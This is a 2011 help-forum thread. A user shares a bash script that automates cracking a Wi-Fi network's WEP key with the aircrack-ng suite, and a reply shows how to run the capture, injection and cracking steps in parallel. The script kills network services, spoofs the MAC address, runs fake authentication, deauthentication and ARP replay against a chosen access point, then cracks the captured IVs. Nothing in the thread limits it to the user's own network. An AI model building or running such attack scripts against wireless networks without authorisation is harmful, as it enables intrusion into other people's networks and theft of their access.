---
title: "Shell script help"
date: 2011-10-27
forum: General Help
---

### Post by thomas515 on 2011-10-27
I'm writing a script to automate some things. I need to open multiple windows at one point. I've figured out how to open them and execute the code one by one, however I need three windows to open at once and continue to run at the same time. any help would be greatly appreciated.

---

### Post by dave01945 on 2011-10-27
If you can tell us what you are trying to open that would help also a copy of the script would be easier to see what is going wrong

---

### Post by thomas515 on 2011-10-27
I'm trying to write a script to automate aircrack-ng for WEP cracking. 
```

#!/bin/bash
function pause(){
   read -p "$*"
}
clear
sudo airmon-ng check
read -p "would you like to kill these processes? : " proKill
if [ $proKill = y ] ; then
	sudo killall -e NetworkManager
	sudo killall -e NetworkManagerDispatcher
	sudo killall -e wpa_supplicant
	sudo killall -e avahi-daemon
	sudo airmon-ng check kill
fi
clear
#This line selects the interface
read -p "Which interface would you like to use : " interface
sudo airmon-ng $interface
clear
#For changing your MAC address. Recomended, but not required.
read -p "Would you like to change your MAC address? (y/n) : " macChange
clear
if [ $macChange = y ] ; then
	read -p "Would you like a random MAC address? (y/n) : " randomMac
	if [ $randomMac = y ] ; then
		sudo ifconfig mon0 down
        	sudo ifconfig $interface down
        	sudo macchanger -r mon0
        	sudo macchanger -r $interface
        	sudo ifconfig mon0 up
        	sudo ifconfig $interface up
		echo $mac
	else
		read -p "What MAC address would you like? : " customMac
		sudo ifconfig mon0 down
        	sudo ifconfig $interface down
        	sudo macchanger -m $customMac mon0
        	sudo macchanger -m $customMac $interface
        	sudo ifconfig mon0 up
        	sudo ifconfig $interface up
	fi
fi
sudo airmon-ng stop mon0
sudo airmon-ng start $interface
clear
echo 'Start airodump-ng to find available networks.' 
echo 'Make note of the BSSID and ESSID'
pause 'Press enter to continue'
sudo xterm -e "sudo airodump-ng mon0"
read -p "What is the MAC address of the AP? : " bssid
clear
read -p "What is the name of the AP? : " name
clear
read -p "What channel is the AP on? : " channel
#The following will test for packet injection. 
sudo xterm -e "sudo aireplay-ng -9 -e $name -a $bssid mon0 ; read -p" 
#The purpose of this step is to capture the IVs generated. 
#This step starts airodump-ng to capture the IVs from the specific access point.
echo "This step starts airodump-ng to capture the IVs"
echo "from the specific access point."
echo "You need to choose a name for the file that stores the IVs"
echo "for later use in cracking the key"
read -p "What would you like to name the file? : " output

sudo xterm -hold -e "sudo airodump-ng -c $channel --bssid $bssid -w $output mon0" 
sudo xterm -hold -e "aireplay-ng -1 6000 -0 1 -q 10 -e $name -a $bssid -h  mon0"
sudo xterm -hold -e "aireplay-ng -3 -b $bssid -h $ourMac mon0"
sudo xterm -hold -e "aircrack-ng -b $bssid $output*.cap" 

```

The problem i'm having starts around the packet injection command. There I need three separate windows to open and run different commands. the way it's working now is it opens one at a time only after the previous one is closed.

---

### Post by Lars Noodén on 2011-10-27
The ampersand (&) will run the process in the background and allow you to continue working with other thing while it runs.  For example, the following 4 windows will open and be running at the same time, as will the next item to follow them in the script:

```

sudo xterm -hold -e "sudo airodump-ng -c $channel --bssid $bssid -w $output mon0" &
sudo xterm -hold -e "aireplay-ng -1 6000 -0 1 -q 10 -e $name -a $bssid -h  mon0" &
sudo xterm -hold -e "aireplay-ng -3 -b $bssid -h $ourMac mon0" &
sudo xterm -hold -e "aircrack-ng -b $bssid $output*.cap" &

```

---

### Post by thomas515 on 2011-10-27
Thank you very much. That seems to be working. A few little tweaks and I'll know for sure.

---

